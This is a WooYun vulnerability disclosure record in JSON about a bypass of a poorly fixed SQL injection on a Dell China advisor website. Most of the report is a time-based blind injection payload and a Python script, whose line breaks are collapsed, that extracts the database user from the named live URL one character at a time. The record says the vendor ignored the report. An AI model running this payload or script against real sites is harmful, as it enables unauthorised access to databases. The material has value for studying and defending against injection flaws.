{"id": 67719, "wybug_id": "wooyun-2015-0151762", "wybug_title": "戴尔中国某站注入修复不当可绕过(附验证脚本)", "wybug_corp": "戴尔中国", "wybug_author": "路人甲", "wybug_date": "2015-11-04 15:05", "wybug_open_date": "2015-11-09 15:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 挖个洞不容易，希望审核能在看一下。。 详细说明：   WooYun: 戴尔中国某站存在SQL注入 之前的洞能用and order by 现在添加了过滤，现在用or 注入出了数据，这算重复吗？\nhttp://advisor.dell-brand.com/index.php?a=search&cid=1&m=solution&sid=6&wd=e\n构造语句\nor if(ord(mid(user(),1,1))=97,sleep(5),1)\n   漏洞证明：  脚本\nimport urllib2import urllibpayloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'name = \"\"#http://advisor.dell-brand.com/index.php?a=search&cid=1&m=solution&sid=6 or if(ascii(mid(user(),1,1))=98,sleep(5),1)&wd=e  for i in range(1,18):    for p in payloads:        s1 = \"%s\" %(i)        s2 = \"%s\" %(ord(p))        s = \"http://advisor.dell-brand.com/index.php?a=search&cid=1&             m=solution&sid=6+or+if(ascii(mid(user()%2c\"+s1+\"%2c1))%3d\"+s2+\"%2csleep(5)%2c1)&wd=e\"        try:            req = urllib2.Request(s)             req_data=urllib2.urlopen(req,timeout=5)        except urllib2.URLError,e:            name = name+p            print name+'........................'            break\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-09 15:06 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}